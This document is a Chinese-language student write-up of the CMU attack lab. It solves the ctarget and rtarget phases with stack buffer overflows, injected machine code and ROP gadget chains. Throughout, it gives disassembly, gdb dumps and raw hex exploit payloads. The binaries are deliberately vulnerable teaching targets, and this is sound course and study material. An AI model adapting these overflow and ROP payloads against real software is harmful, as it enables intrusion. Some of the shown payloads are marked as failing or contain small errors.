# ctarage:

```
Linux binary with code-injection vulnerability.  To be used for phases
1-3 of the assignment.
```

这个lab的意思是 利用栈溢出等技术 将函数流劫持到相应的touch 并执行

先将需要注入的代码写入`solutions/level.txt` 然后执行：

```
./hex2raw -i solution/level1.txt | ./ctarget -q
```



## touch1:

`Touch1!: You called touch1()`

源码：

```
unsigned int __cdecl getbuf()
{
  char buf[32]; // [rsp+0h] [rbp-28h] BYREF

  Gets(buf);
  return 1;
}
```

```
char *__fastcall Gets(char *dest)
{
  char *i; // rbx
  int v2; // eax

  gets_cnt = 0;
  for ( i = dest; ; ++i )
  {
    v2 = _IO_getc(infile);
    if ( v2 == -1 || v2 == 10 )
      break;
    *i = v2;
    save_char(v2);
  }
  *i = 0;
  save_term();
  return dest;
}
```

存在缓冲区溢出 在只能读入0x28大小的栈内 使用了IO_getc可以读入不限制大小的数据

ret2text 不多说了

exp:

```
'a'*0x28+p64(0x4017C0)
```

```
61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 C0 17 40 
```



## touch2:

加入了检查 要先判断是否跟cookie相等 

cookie已经在题目中给出了`0x59b997fa`：

```
.text:00000000004017EC ; Attributes: noreturn
.text:00000000004017EC
.text:00000000004017EC ; void __fastcall touch2(unsigned int val)
.text:00000000004017EC                 public touch2
.text:00000000004017EC touch2          proc near
.text:00000000004017EC val = rdi                               ; unsigned int
.text:00000000004017EC ; __unwind {
.text:00000000004017EC                 sub     rsp, 8
.text:00000000004017F0                 mov     edx, edi
.text:00000000004017F2                 mov     cs:vlevel, 2
.text:00000000004017FC                 cmp     edi, cs:cookie
.text:0000000000401802                 jnz     short loc_401824
.text:0000000000401804                 mov     esi, offset aTouch2YouCalle ; "Touch2!: You called touch2(0x%.8x)\n"
.text:0000000000401809                 mov     edi, 1
.text:000000000040180E val = rdx                               ; unsigned int
.text:000000000040180E                 mov     eax, 0
.text:0000000000401813                 call    ___printf_chk
.text:0000000000401818                 mov     edi, 2          ; level
.text:000000000040181D                 call    validate
.text:0000000000401822                 jmp     short loc_401842
.text:0000000000401824 ; ---------------------------------------------------------------------------
.text:0000000000401824
.text:0000000000401824 loc_401824:                             ; CODE XREF: touch2+16↑j
.text:0000000000401824 val = rdx                               ; unsigned int
.text:0000000000401824                 mov     esi, offset aMisfireYouCall ; "Misfire: You called touch2(0x%.8x)\n"
.text:0000000000401829                 mov     edi, 1
.text:000000000040182E                 mov     eax, 0
.text:0000000000401833                 call    ___printf_chk
.text:0000000000401838                 mov     edi, 2          ; level
.text:000000000040183D                 call    fail
.text:0000000000401842
.text:0000000000401842 loc_401842:                             ; CODE XREF: touch2+36↑j
.text:0000000000401842                 mov     edi, 0          ; status
.text:0000000000401847                 call    _exit
.text:0000000000401847 ; } // starts at 4017EC
```

构造rdi传参 将cookie的值传入 然后在栈顶写入跳转函数touch2的地址

```
cmp     edi, cs:cookie
```

构造的gadget：

```
movq $0x59b997fa,%rdi
pushq $0x4017C0
retq
```

得到16进制机器码

```
➜  target1 git:(master) ✗ gcc -c code.s
➜  target1 git:(master) ✗ objdump -d code.o > code.d  
```

```

code.o：     文件格式 elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 c0 17 40 00       	pushq  $0x4017c0
   c:	c3                   	retq    
```

```
48 c7 c7 fa 97 b9 59
68 c0 17 40 00 
c3
```

然后填充到0x28加上栈顶地址



断到getbuf部分 可以看到此时的栈顶即`rsp=0x5561dc78` 

```properties
 RAX  0x5561dc78 ◂— jae    0x5561dce3 /* 0x6973; 'si' */
 RBX  0x55586000 ◂— 0
 RCX  0x4
 RDX  0x7ffff7dd3790 (_IO_stdfile_0_lock) ◂— 0x0
 RDI  0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2288
 RSI  0xa
 R8   0x7ffff7fd8700 ◂— 0x7ffff7fd8700
 R9   0x7ffff7fd8700 ◂— 0x7ffff7fd8700
 R10  0x814
 R11  0x246
 R12  0x2
 R13  0x0
 R14  0x0
 R15  0x0
 RBP  0x55685fe8 —▸ 0x402fa5 ◂— push   0x3a6971 /* 'hqi:' */
 RSP  0x5561dc78 ◂— jae    0x5561dce3 /* 0x6973; 'si' */
 RIP  0x4017b4 (getbuf+12) ◂— mov    eax, 1
───────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────
   0x4017a8 <getbuf>       sub    rsp, 0x28
   0x4017ac <getbuf+4>     mov    rdi, rsp
   0x4017af <getbuf+7>     call   Gets <0x401a40>
 
 ► 0x4017b4 <getbuf+12>    mov    eax, 1
   0x4017b9 <getbuf+17>    add    rsp, 0x28
   0x4017bd <getbuf+21>    ret    

```



最终exp：

```
48 c7 c7 fa 97 b9 59
68 ec 17 40 00
c3 
61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61
78 DC 61 55 00 00 00 00
```







## touch3:

在之前基础上加上了一个十六进制字符串比较的判断函数：

```
.text:00000000004018FA
.text:00000000004018FA ; Attributes: noreturn
.text:00000000004018FA
.text:00000000004018FA ; void __fastcall touch3(char *sval)
.text:00000000004018FA                 public touch3
.text:00000000004018FA touch3          proc near
.text:00000000004018FA sval = rdi                              ; char *
.text:00000000004018FA ; __unwind {
.text:00000000004018FA                 push    rbx
.text:00000000004018FB                 mov     rbx, sval
.text:00000000004018FE                 mov     cs:vlevel, 3
.text:0000000000401908                 mov     rsi, sval       ; sval
.text:000000000040190B                 mov     edi, cs:cookie  ; val
.text:0000000000401911 sval = rbx                              ; char *
.text:0000000000401911                 call    hexmatch
.text:0000000000401916                 test    eax, eax
.text:0000000000401918                 jz      short loc_40193D
.text:000000000040191A                 mov     rdx, sval
.text:000000000040191D                 mov     esi, offset aTouch3YouCalle ; "Touch3!: You called touch3(\"%s\")\n"
.text:0000000000401922                 mov     edi, 1
.text:0000000000401927                 mov     eax, 0
.text:000000000040192C                 call    ___printf_chk
.text:0000000000401931                 mov     edi, 3          ; level
.text:0000000000401936                 call    validate
.text:000000000040193B                 jmp     short loc_40195E
.text:000000000040193D ; ---------------------------------------------------------------------------
.text:000000000040193D
.text:000000000040193D loc_40193D:                             ; CODE XREF: touch3+1E↑j
.text:000000000040193D                 mov     rdx, sval
.text:0000000000401940                 mov     esi, offset aMisfireYouCall_0 ; "Misfire: You called touch3(\"%s\")\n"
.text:0000000000401945                 mov     edi, 1
.text:000000000040194A                 mov     eax, 0
.text:000000000040194F                 call    ___printf_chk
.text:0000000000401954                 mov     edi, 3          ; level
.text:0000000000401959                 call    fail
.text:000000000040195E
.text:000000000040195E loc_40195E:                             ; CODE XREF: touch3+41↑j
.text:000000000040195E                 mov     edi, 0          ; status
.text:0000000000401963                 call    _exit
.text:0000000000401963 ; } // starts at 4018FA
.text:0000000000401963 touch3          endp
```

```
.text:000000000040184C ; __unwind {
.text:000000000040184C                 push    r12
.text:000000000040184E                 push    rbp
.text:000000000040184F                 push    rbx
.text:0000000000401850                 add     rsp, 0FFFFFFFFFFFFFF80h
.text:0000000000401854                 mov     r12d, edi
.text:0000000000401857                 mov     rbp, sval
.text:000000000040185A                 mov     rax, fs:28h
.text:0000000000401863                 mov     [rsp+98h+var_20], rax
.text:0000000000401868                 xor     eax, eax
.text:000000000040186A                 call    _random
.text:000000000040186F                 mov     rcx, rax
.text:0000000000401872                 mov     rdx, 0A3D70A3D70A3D70Bh
.text:000000000040187C                 imul    rdx
.text:000000000040187F                 add     rdx, rcx
.text:0000000000401882                 sar     rdx, 6
.text:0000000000401886                 mov     rax, rcx
.text:0000000000401889                 sar     rax, 3Fh
.text:000000000040188D                 sub     rdx, rax
.text:0000000000401890                 lea     rax, [rdx+rdx*4]
.text:0000000000401894                 lea     rax, [rax+rax*4]
.text:0000000000401898                 shl     rax, 2
.text:000000000040189C                 sub     rcx, rax
.text:000000000040189F                 lea     rbx, [rsp+rcx+98h+cbuf]
.text:00000000004018A3 s = rbx                                 ; char *
.text:00000000004018A3                 mov     r8d, r12d
.text:00000000004018A6                 mov     ecx, offset a8x ; "%.8x"
.text:00000000004018AB                 mov     rdx, 0FFFFFFFFFFFFFFFFh
.text:00000000004018B2                 mov     esi, 1
.text:00000000004018B7                 mov     rdi, s
.text:00000000004018BA                 mov     eax, 0
.text:00000000004018BF                 call    ___sprintf_chk
.text:00000000004018C4                 mov     edx, 9          ; n
.text:00000000004018C9                 mov     rsi, s          ; s2
.text:00000000004018CC                 mov     rdi, sval       ; s1
.text:00000000004018CF                 call    _strncmp
.text:00000000004018D4                 test    eax, eax
.text:00000000004018D6                 setz    al
.text:00000000004018D9                 movzx   eax, al
.text:00000000004018DC                 mov     rsi, [rsp+98h+var_20]
.text:00000000004018E1                 xor     rsi, fs:28h
.text:00000000004018EA                 jz      short loc_4018F1
.text:00000000004018EC                 call    ___stack_chk_fail
.text:00000000004018F1 ; ---------------------------------------------------------------------------
.text:00000000004018F1
.text:00000000004018F1 loc_4018F1:                             ; CODE XREF: hexmatch+9E↑j
.text:00000000004018F1                 sub     rsp, 0FFFFFFFFFFFFFF80h
.text:00000000004018F5                 pop     s
.text:00000000004018F6                 pop     sval
.text:00000000004018F7                 pop     val
.text:00000000004018F9                 retn
.text:00000000004018F9 ; } // starts at 40184C
.text:00000000004018F9 hexmatch        endp
```

但是 在hexmatch函数中调用的strncmp会向栈中写入数据 所以如果还是将数据字符串存入0x28个字符中时 有可能会覆盖掉数据 所以在栈顶就要传入数据 也就是需要知道rsp地址

gdb看一下

```
 RAX  0x1
 RBX  0x55586000 ◂— 0
 RCX  0x4
 RDX  0x7ffff7dd3790 (_IO_stdfile_0_lock) ◂— 0x0
 RDI  0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2288
 RSI  0xa
 R8   0x7ffff7fd8700 ◂— 0x7ffff7fd8700
 R9   0x7ffff7fd8700 ◂— 0x7ffff7fd8700
 R10  0x814
 R11  0x246
 R12  0x2
 R13  0x0
 R14  0x0
 R15  0x0
 RBP  0x55685fe8 —▸ 0x402fa5 ◂— push   0x3a6971 /* 'hqi:' */
 RSP  0x5561dca8 ◂— 2
 RIP  0x401976 (test+14) ◂— mov    edx, eax

   0x401968 <test>       sub    rsp, 8
   0x40196c <test+4>     mov    eax, 0
   0x401971 <test+9>     call   getbuf <0x4017a8>
 
 ► 0x401976 <test+14>    mov    edx, eax
   0x401978 <test+16>    mov    esi, 0x403188
   0x40197d <test+21>    mov    edi, 1
   0x401982 <test+26>    mov    eax, 0
   0x401987 <test+31>    call   __printf_chk@plt <0x400df0>
 
   0x40198c <test+36>    add    rsp, 8
   0x401990 <test+40>    ret    
 
   0x401991              nop    

```

也就是

```
mov rdi,0x5561dca8
push 0x4018fa
ret
```

在上面基础上 只要再加上将cookie的十六进制字符串 

在在内存中通过ascii码实现 所以也就是：

```
35 39 62 39 39 37 66 61
```



exp：

```
48 c7 c7 a8 dc 61 55
68 fa 18 40 00
c3 
61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61
78 DC 61 55 00 00 00 00
35 39 62 39 39 37 66 61
```



# rtarget：

```
Linux binary with return-oriented programming vulnerability.  To be
used for phases 4-5 of the assignment.
```

这次题目表示 不能只执行到相应touch 而且还要将

rop  ~~寄存器(bushi~~

找了下 汇编对应的机器码

![img](https://upload-images.jianshu.io/upload_images/1433829-d6312f1ce53cf044.png?imageMogr2/auto-orient/strip|imageView2/2/format/webp)

![img](https://upload-images.jianshu.io/upload_images/1433829-2a663eb32fae331a.png?imageMogr2/auto-orient/strip|imageView2/2/w/574/format/webp)

![img](https://upload-images.jianshu.io/upload_images/1433829-c713c395456655fa.png?imageMogr2/auto-orient/strip|imageView2/2/w/621/format/webp)

![img](https://upload-images.jianshu.io/upload_images/1433829-67690582e19e902b.png?imageMogr2/auto-orient/strip|imageView2/2/w/586/format/webp)



## touch1:

跟上面的一样的



## touch2：

```
unsigned int __cdecl getbuf()
{
  char buf[32]; // [rsp+0h] [rbp-28h] BYREF

  Gets(buf);
  return 1;
}
```

输入还是没有变化

同样 touch2也没有什么变化 

```
void __cdecl __noreturn touch2(unsigned int val)
{
  vlevel = 2;
  if ( val == cookie )
  {
    __printf_chk(1LL, "Touch2!: You called touch2(0x%.8x)\n", val);
    validate(2);
  }
  else
  {
    __printf_chk(1LL, "Misfire: You called touch2(0x%.8x)\n", val);
    fail(2);
  }
  exit(0);
}
```

但我们这次不能直接通过代码注入的方式 而是要用相应的gadget 因为题目给出了大量的gadget



可以通过先将cookie传入rax然后 传入rdi

也就是

```
pop rax
mov rdi,rax
```

pop rax对应机器码为`58` mov rdi,rax的机器码为`48 89`

gadget：

```
0000000000401990  C3 90 90 90 B8 01 00 00  00 C3 B8 FB 78 90 90 C3
00000000004019A0  8D 87 48 89 C7 C3 C3 8D  87 51 73 58 90 C3 C7 07
00000000004019B0  48 89 C7 C7 C3 C7 07 54  C2 58 92 C3 C7 07 63 48
00000000004019C0  8D C7 C3 C7 07 48 89 C7  90 C3 B8 29 58 90 C3 C3

pop rax:0x4019b9
mov rdi,rax:0x4019b0
```

所以，exp:

```
‘a'*0x28 + p64(0x4019b9) + p64(cookie) + p64(0x4019EF) + p64(0x4017c0)
p64是补齐8字节

61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 
b9 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
b0 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

不太对 应该是gadget有问题

总之就是：

```
58 90
48 89
```

成功：

```
61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

```
61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 
cc 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
c5 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```





## touch3:

构造：

![img](https://upload-images.jianshu.io/upload_images/1433829-cafcf76d35ef7ba1.png?imageMogr2/auto-orient/strip|imageView2/2/format/webp)



```
mov rax,rsp
mov rdi,rax
pop rax
push 0x48
mov edx,eax
mov ecx,edx
mov esi,ecx
lea rax,[rdi+rsi]
mov rdi,rax
push touch3
push 0x35396239396661
```

也就是构造以下的gadget：

```
48 89 e0
48 89 c7
58
0x48
89 c2
89 d1
89 ce
lea 
48 89 c7
0x04018fa
0x35396239396661
```



exp:

```
'a'*0x28 + p64(0x401a06) + p64(0x4019c5) + p64(0x4019cc) + p64(0x48) + p64(0x4019dd) + p64(0x401a34) + p64(0x401a63) + p64(0x4019d6) + p64(0x4019c5) + p64(0x04018fa) + p64(0x35396239396661) 
```

```
61 61 61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61 61 61
06 1a 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
cc 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00
dd 19 40 00 00 00 00 00
34 1a 40 00 00 00 00 00
63 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61 00
```

另一条gadget:

```
‘a'*0x28 + p64(0x401a06) + p64(0x4019a2) + p64(0x4019cc) + p64(0x48) + p64(0x4019dd) + p64(0x401a70) + p64(0x401a13) + p64(0x401ad6) + p64(0x4019d6) + p64(0x4019a2) + p64(0x4018fa) + p64(0x3539623939376661)
```

```
61 61 61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61 61 61
06 1a 40 00 00 00 00 00 
a2 19 40 00 00 00 00 00 
cc 19 40 00 00 00 00 00 
48 00 00 00 00 00 00 00 
dd 19 40 00 00 00 00 00 
70 1a 40 00 00 00 00 00 
13 1a 40 00 00 00 00 00 
d6 19 40 00 00 00 00 00 
a2 19 40 00 00 00 00 00 
fa 18 40 00 00 00 00 00 
35 39 62 39 39 37 66 61 00
```

pass



# 总结：

汇编up up ➕

and

gadget使用 up up ➕
